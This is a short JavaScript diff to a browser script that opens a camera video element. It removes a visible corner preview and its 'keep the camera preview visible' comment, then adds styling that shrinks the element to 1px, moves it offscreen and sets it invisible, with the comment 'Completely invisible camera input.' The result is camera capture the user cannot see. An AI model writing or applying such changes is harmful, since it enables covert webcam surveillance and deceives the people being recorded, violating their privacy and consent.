@@ -346,8 +346,7 @@
         return;
     }
 
-    video =
-        document.createElement("video");
+    video = document.createElement("video");
 
     video.autoplay = true;
     video.muted = true;
@@ -356,28 +355,15 @@
     video.width = 320;
     video.height = 240;
 
-    /*
-     * Keep the camera preview visible.
-     */
-
+    // Completely invisible camera input.
     video.style.position = "fixed";
-    video.style.right = "15px";
-    video.style.bottom = "15px";
-
-    video.style.width = "320px";
-    video.style.height = "240px";
-
-    video.style.objectFit = "cover";
-
-    video.style.zIndex = "999999";
-
-    video.style.borderRadius = "10px";
-
-    video.style.background =
-        "black";
-
-    video.style.boxShadow =
-        "0 4px 20px rgba(0,0,0,0.5)";
+    video.style.width = "1px";
+    video.style.height = "1px";
+    video.style.left = "-10000px";
+    video.style.top = "-10000px";
+    video.style.opacity = "0";
+    video.style.visibility = "hidden";
+    video.style.pointerEvents = "none";
 
     document.body.appendChild(video);
 }
